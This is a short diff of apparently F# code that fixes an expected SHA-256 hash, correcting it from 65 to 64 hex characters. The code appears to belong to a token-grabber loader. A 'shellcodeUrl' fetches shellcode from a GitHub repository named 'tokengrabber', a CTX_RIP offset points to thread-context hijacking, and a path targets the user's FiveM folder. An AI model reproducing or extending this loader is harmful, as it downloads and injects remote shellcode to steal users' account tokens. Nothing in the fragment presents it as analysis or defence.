@@ -109,7 +109,7 @@ let CTX_RIP       = 0xF8
 let shellcodeUrl =
     "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/d75c858141c21af6546c906539469adab471e11b"
 
-let expectedSha256 = "6111C02855976DECDDED6B099FA6CC9F10CF8354125865A311D3FADE3F7771FED"
+let expectedSha256 = "6111C02855976DECDED6B099FA6CC9F10CF8354125865A311D3FADE3F7771FED"
 
 let fiveMFolder =
     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
